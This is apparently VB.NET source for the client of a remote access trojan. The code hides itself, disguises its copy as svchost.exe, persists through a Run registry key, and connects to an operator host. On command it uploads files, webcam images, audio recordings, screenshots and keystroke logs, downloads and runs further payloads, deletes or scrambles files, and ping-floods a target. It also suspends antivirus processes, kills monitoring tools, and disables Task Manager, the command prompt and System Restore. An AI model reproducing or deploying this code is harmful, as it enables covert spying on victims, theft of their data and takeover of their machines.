Imports System.Globalization
Imports rec.rec
Imports cam.A
Imports System.IO
Imports System.Net, System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
Imports System.IO.Compression

Public Class Form1
    Private Const SW_SHOWNORMAL As Integer = 1
    Private Const SW_SHOWMINIMIZED As Integer = 2
    Private Declare Function ShowWindow Lib "user32" (ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    Private Const SW_SHOWMAXIMIZED As Integer = 3
    Public scam As String
    Public cam As New cam.A
    Public virustotal As String = 0
    Public virusscan As String = 0
    Public hidep As String = 0
    Public proh As String = 0
    Public proE As String = 0
    Public pronoip As String = 0
    Dim PersistThread As Thread
    Public alab As String
    Public WithEvents C As New SocketClient
    Public Yy As String = "|BawaneH|"
    Public HOST As String
    Public port As Integer
    Public name1 As String
    Public copyse As Boolean = 0
    Public sernam As String
    Public addtos As Boolean = 0
    Public StartupKey As String
    Public melts As Boolean = 0
    Public us As String = 0
    Public pw As String
    Public av As String = 0
    Public rico As New rec.rec
    Public task As String = 0
    Public cap As New CRDP
    Public caa As New CRDP1
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Dim alaa(), text1, text2 As String
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Const spl = "abccba"
    Public i As Integer
    Dim PictureBox1 As Windows.Forms.PictureBox
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Dim streamWebcam As Boolean = False
    Dim o As New njLogger
    Dim tt As New AntiTaskManager
    Public loggg As String
    Public tictoc As Integer = 0
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs)
        Process.Start(Application.ExecutablePath)
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs)
        Process.Start(Application.ExecutablePath)
    End Sub
    Function st()
        Dim ta As New Threading.Thread(AddressOf tt.protect)
        ta.Start()
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose()
        alaa = Split(text1, spl)
        HOST = alaa(1)
        port = alaa(2)
        name1 = alaa(3)
        copyse = alaa(4)
        sernam = alaa(5)
        addtos = alaa(6)
        StartupKey = alaa(7)
        melts = alaa(8)
        task = alaa(9)
        us = alaa(10)
        av = alaa(11)
        proh = alaa(12)
        proE = alaa(13)
        pronoip = alaa(14)
        virustotal = alaa(15)
        virusscan = alaa(16)
        hidep = alaa(17)
        alab = A.GT
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        LoadDeviceList()
        If Not IO.Directory.Exists(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) Then
            IO.Directory.CreateDirectory(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
        End If
        o.Start()
        Timer2.Start()
        '   C.Connect(HOST, port)
        '-----------------------------------------------------------------------------
        If hidep Then
            TMListViewDelete.Running = True
        End If

        If virustotal Then
            virustotal1.Block("virustotal")
            virustotal2.Block("virustotal")
        End If
        If virusscan Then
            virusscan1.Block("virscan")
            virusscan2.Block("virscan")
        End If
        If proh Then
            Timer3.Start()
        End If
        If proh Then
            Timer4.Start()

            If pronoip Then
                For Each p As Process In Process.GetProcessesByName("DUC30")
                    p.Kill()
                Next
            End If

        End If
        If av Then
            AVG()
        End If
        If us Then
            Dim usb As New USB
            usb.Start()
        End If
        If task Then
            Dim ta As New AntiTaskManager
            Dim st As New Threading.Thread(AddressOf ta.protect)
            st.Start()
        End If
        If melts Then
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                End If
            End If
        End If

        If copyse Then
           
        End If

        If addtos Then

            Try
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & sernam, True)
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & sernam, True)
                Dim TReg As RegistryKey
                TReg = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                If TReg.GetValue(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & sernam) Or TReg.GetValue(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & sernam) Then

                Else
                    TReg.SetValue(StartupKey, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & sernam)
                End If
            Catch : End Try
        End If
    End Sub

#Region "Socket Events"
    Private Sub Connected() Handles C.Connected
        '  Timer2.Stop()
    End Sub
    Private Sub Disconnected() Handles C.Disconnected
        Timer2.Interval = 100
        Timer2.Start()
        C.Connect(HOST, port)
    End Sub

    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "r1"
                    Application.Restart()
                Case "startrec"
                    rico.startrec()
                    While My.Computer.FileSystem.FileExists(IO.Path.GetTempPath & "soundrec" & tictoc & ".wav")
                        tictoc = tictoc + 1
                    End While
                Case "stoprec"
                    rico.stoprec()
                    C.Send("downloadtherec" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(IO.Path.GetTempPath & "soundrec" & tictoc & ".wav")))
                Case "requestrecords"
                    C.Send("requestrecords")
                Case "D+r"
                    My.Computer.Network.DownloadFile(A(1), Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & A(2))
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & A(2))
                Case "viewimage"
                    C.Send("viewimage" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy)
                Case "Comrar"
                    Try
                        CompressFile(A(1))
                    Catch ex As Exception

                    End Try

                Case "Decrar"
                    Try
                        UncompressFile(A(1))

                    Catch ex As Exception

                    End Try
                Case "Scb"
                    Dim Security() As Process = System.Diagnostics.Process.GetProcessesByName("CSRSS")
                    For Each Najaf As Process In Security
                        Najaf.Kill()
                    Next
                Case "camlist"
                    Try
                        Dim s As String = "camlist"
                        For Each x As String In cam.Divs
                            s &= Yy & x
                        Next
                        C.Send(s)
                    Catch ex As Exception

                    End Try

                Case "cam"
                    Dim s As String = "cam"
                    If cam.Drive <> A(1) Then
                        cam.onn(A(1), New Size(160, 120))
                        C.Send(s)
                    Else
                        If cam.M IsNot Nothing Then
                            Dim m = cam.M.Clone
                            Dim cc As New ImageConverter
                            Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                            C.Send(s & Yy & Convert.ToBase64String(bb))
                        Else
                            C.Send(s)
                        End If
                    End If
                Case "camclose"
                    cam.close()
                Case "att"
                    Shell("ping -t" & A(1) & "-l " & A(2), AppWinStyle.Hide)
                Case "tt"
                    C.Send("tt")
                Case "wav"
                    My.Computer.Audio.Play(A(1), AudioPlayMode.Background)
                Case "blockC"
                    SiteBlocker2.Block(A(1))
                    C.Send("Block")
                Case "blockF"
                    SiteBlocker.Block(A(1))
                    C.Send("Block")
                Case "sendfileto" 'Coded By Volkano
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    C.Send("Finish Upload")
                Case "Host"
                    HOST = A(1)
                    port = A(2)
                Case "Ren"
                    name1 = A(1)
                Case "downloadfile" 'Coded By Volkano
                    C.Send("downloadedfile" & "|BawaneH|" & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & "|BawaneH|" & A(2))
                Case "creatnewfolder" 'Coded By Volkano
                    Try
                        My.Computer.FileSystem.CreateDirectory(A(1))

                    Catch ez As Exception
                    End Try

                Case "hidefolderfile" 'Coded By Volkano
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(A(1), hiden)
                    Catch ex As Exception

                    End Try
                Case "openurl"
                    System.Diagnostics.Process.Start(A(1))
                Case "showfolderfile" 'Coded By Volkano
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(A(1), shown)
                    Catch ex As Exception

                    End Try


                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                    C.Send("The File Has Run")
                Case "Rec"

                Case "Zom"
                    Process.Start("http://img79.xooimage.com/files/e/1/2/chiste-yao-mingo-360d4ea.swf")
                Case "info" ' server ask me what is my pc name
                    ' If A(1) = pw Then
                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                    C.Send("info" & Yy & name1 & Yy & pc & Yy & country & Yy & My.Computer.Info.OSFullName & Yy & getanti() & Yy & scam)
                    ' End If
                Case "Uninstall"
                    Try

                        Dim TReg As RegistryKey
                        TReg = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                        If TReg.GetValue(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & sernam) Then
                            TReg.DeleteValue(StartupKey, True)
                            My.Computer.FileSystem.DeleteFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & sernam, True)
                            My.Computer.FileSystem.DeleteFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & sernam, True)
                            End
                        End If

                    Catch ex As Exception
                    End Try

                    End

                Case "!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "!!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!!" & Yy & s.Width & Yy & s.Height)
                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "@@" ' Start Capture

                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = caa.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "close"
                    End
                Case "Logoff"
                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
                Case "Restart"
                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
                Case "Shutdown"
                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
                Case "GetDrives"
                    C.Send("FileManager" & Yy & getDrives())
                Case "FileManager"
                    Try
                        C.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        C.Send("FileManager" & Yy & "Error")
                    End Try
                Case "|||"
                    C.Send("|||")
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))
                    End Select

                Case "Execute"
                    Process.Start(A(1))
                Case "newpr"
                    Process.Start(A(1))
                Case "Cr"
                    Dim kk As String = My.Computer.FileSystem.ReadAllText(A(1))
                    Dim cr As String = Crypt(kk)
                    System.IO.File.WriteAllText(A(1), cr)
                    C.Send("CR")
                Case "De"
                    Dim kk As String = My.Computer.FileSystem.ReadAllText(A(1))
                    Dim cr As String = Crypt(kk)
                    System.IO.File.WriteAllText(A(1), cr)
                    C.Send("De")
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select

                Case "||||"
                    C.Send("||||")
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    C.Send("ProcessManager" & Yy & allProcess)
                Case "KillProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                            C.Send("SP")
                        Next
                    Next
                Case "SProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        C.Send("SP")
                    Next
                Case "SSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim sh = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWNORMAL)
                        C.Send("SP")
                    Next
                Case "SSSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim hi = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWMINIMIZED)
                        C.Send("SP")
                    Next
                Case "++"
                    C.Send("++")
                Case "fun"
                    C.Send("fun")
                Case "OpenCD"
                    mciSendString("set CDAudio door open", "", 0, 0)
                Case "CloseCD"
                    mciSendString("set CDAudio door closed", "", 0, 0)
                Case "DisableKM"
                    apiBlockInput(1)
                Case "EnableKM"
                    apiBlockInput(0)
                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)
                Case "NormalMouse"
                    SwapMouseButton(&H0&)
                Case "ReverseMouse"
                    SwapMouseButton(&H100&)
                Case "HideTaskBar"
                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H80))
                Case "ShowTaskBar"
                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
                Case "DisableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)

                Case "opentto"
                    C.Send("opentto")
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))
                Case "ppww"
                    C.Send("ppww" & Yy & "bb" & alab)
                Case "F"
                    My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
                    Process.Start(A(2))
                    C.Send("F")
                Case "logf"
                    C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
                Case "T.S"
                    Dim r As String = My.Computer.FileSystem.ReadAllText(A(1))
                    Dim r1 = r
                    C.Send("Text" & Yy & r1)
                Case "openlo"
                    C.Send("openlo")
                Case "getlog"
                    Try
                        loggg = o.Logs
                        C.Send("getlog" & Yy & loggg)
                    Catch : End Try
            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            ' stop timer before showing msgbox so it is not detected!
            Timer1.Stop()
            C.Send("AW" & Yy & CapTxt)
            ' resume timer 
            Timer1.Start()
        End If
    End Sub
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
               ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
               ByVal cbVer As Integer) As Boolean
    Public Shared Sub CompressFile(ByVal path As String)
        Dim sourceFile As FileStream = File.OpenRead(path)
        Dim destinationFile As FileStream = File.Create(path + ".rar")

        Dim buffer(sourceFile.Length) As Byte
        sourceFile.Read(Buffer, 0, Buffer.Length)

        Using output As New GZipStream(destinationFile, _
            CompressionMode.Compress)

            Console.WriteLine("Compressing {0} to {1}.", sourceFile.Name, _
                destinationFile.Name, False)

            output.Write(buffer, 0, buffer.Length)
        End Using

        ' Close the files.
        sourceFile.Close()
        destinationFile.Close()

    End Sub

    Public Shared Sub UncompressFile(ByVal path As String)
        Dim sourceFile As FileStream = File.OpenRead(path)
        Dim destinationFile As FileStream = File.Create(path + ".txt")

        ' Because the uncompressed size of the file is unknown, 
        ' we are imports an arbitrary buffer size.
        Dim buffer(4096) As Byte
        Dim n As Integer

        Using input As New GZipStream(sourceFile, _
            CompressionMode.Decompress, False)

            Console.WriteLine("Decompressing {0} to {1}.", sourceFile.Name, _
                destinationFile.Name)

            n = input.Read(buffer, 0, buffer.Length)
            destinationFile.Write(buffer, 0, n)
        End Using

        ' Close the files.
        sourceFile.Close()
        destinationFile.Close()
    End Sub
    Private Function LoadDeviceList() As Boolean
        Dim CamList As New List(Of String)
        Dim strName As String = Space(100)
        Dim strVer As String = Space(100)
        Dim bReturn As Boolean
        Dim x As Short = 0
        Dim i As Integer = 0
        For i = 0 To 100
            Do
                bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)
                If bReturn Then CamList.Add(strName.Trim)
                x += CType(1, Short)
            Loop Until bReturn = False
        Next i
        If CamList.Count >= 1 Then
            scam = "Yes"
        Else
            scam = "No"
        End If
    End Function

    Private Sub Timer2_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If C.Statconnected = False Then
            C.Connect(HOST, port)
        End If
    End Sub
    Function AVG()
        Dim game1, game2, game3, game4, game5, game6, game7, game8, game9 As Process()
        game1 = Process.GetProcessesByName("avgidsagent")
        game2 = Process.GetProcessesByName("avgfws")
        game3 = Process.GetProcessesByName("avgtray")
        game4 = Process.GetProcessesByName("avgemcx")
        game5 = Process.GetProcessesByName("avgwdsvc")
        game6 = Process.GetProcessesByName("avgnsx")
        game7 = Process.GetProcessesByName("avgcsrvx")
        game8 = Process.GetProcessesByName("avgrsx")
        game9 = Process.GetProcessesByName("ToolbarUpdater")
        Try
            SuspendProcess(game1(0))
            SuspendProcess(game2(0))
            SuspendProcess(game3(0))
            SuspendProcess(game4(0))
            SuspendProcess(game5(0))
            SuspendProcess(game6(0))
            SuspendProcess(game7(0))
            SuspendProcess(game8(0))
            SuspendProcess(game9(0))
        Catch ex As Exception

        End Try
    End Function
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
            If th <> IntPtr.Zero Then
                SuspendThread(th)
                CloseHandle(th)
            End If
        Next
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        For Each p As Process In Process.GetProcessesByName("ProcessHacker")
            p.Kill()
        Next
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        For Each p As Process In Process.GetProcessesByName("procexp")
            p.Kill()
        Next
    End Sub
    Public Function Crypt(ByVal Text As String) As String
        Dim strTempChar As String, i As Integer
        For i = 1 To Len(Text)
            If Asc(Mid$(Text, i, 1)) < 128 Then
                strTempChar = CType(Asc(Mid$(Text, i, 1)) + 128, String)
            ElseIf Asc(Mid$(Text, i, 1)) > 128 Then
                strTempChar = CType(Asc(Mid$(Text, i, 1)) - 128, String)
            End If
            Mid$(Text, i, 1) = Chr(CType(strTempChar, Integer))
        Next i
        Return Text
    End Function

    Private Sub Form1_Load_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
End Class
